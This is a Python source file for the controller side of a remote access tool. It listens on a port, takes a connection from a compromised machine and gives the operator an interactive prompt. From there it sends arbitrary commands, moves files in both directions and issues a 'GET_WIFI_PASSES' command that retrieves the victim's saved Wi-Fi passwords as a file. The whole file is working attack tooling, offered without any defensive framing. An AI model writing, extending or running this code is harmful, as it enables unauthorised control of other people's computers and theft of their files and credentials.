import socket


def download_file(filename):
    data = b''
    print(f"[+] Downloading {filename}...")
    while True:
        try:
            con.settimeout(5)
            received_chunk = con.recv(4096)
            data += received_chunk
            bytes_received = len(data)
            print(f"Received {bytes_received} bytes.")
        except TimeoutError:
            file = open(filename, 'wb')
            file.write(data)
            file.close()
            print("[+] Download Ended, Connection Timed Out")
            break


def upload_file(filename):
    print(f"[+] Uploading {filename}")
    file = open(filename, 'rb')
    data = file.read()
    file.close()
    con.sendall(data)


def reliable_receive():
        data = con.recv(4096).decode().rstrip()
        if data:
            return data
        else:
            print("[-] ERROR: Connection Timed Out, client unresponsive.")
            exit(0)


def reliable_send(message):
    con.sendall(bytes(message, "UTF-8"))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '192.168.1.1'
port = 5000
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((ip, port))

print(f"[-] Listening for connections on port {port}...")
s.listen(10)

con, addr = s.accept()
print(f"[+] Connected to {addr}")

while True:
    command = str(input(f"\nanon@{addr}:~$ "))

    if command == 'exit':
        reliable_send(command)
        con.close()
        exit(0)

    elif command.strip() == 'GET_WIFI_PASSES':
        reliable_send(command)
        download_file("WifiPasswords.txt")

    elif command[:3] == 'cd ':
        reliable_send(command)
        response = reliable_receive()
        print(response)

    elif command.strip() == 'ls':
        reliable_send(command)
        response = reliable_receive()
        print(response)

    elif command.strip() == 'dir':
        reliable_send(command)
        response = reliable_receive()
        print(response)

    elif command[:9] == "download ":
        reliable_send(command)
        download_file(command[9:])

    elif command[:7] == "upload ":
        reliable_send(command)
        upload_file(command[7:])
    elif command[:7] == "CUSTOM ":
        reliable_send(command[7:])
        response = reliable_receive()
        print(response)

    elif command.strip() == '':
        continue

    else:
        print("Invalid command")
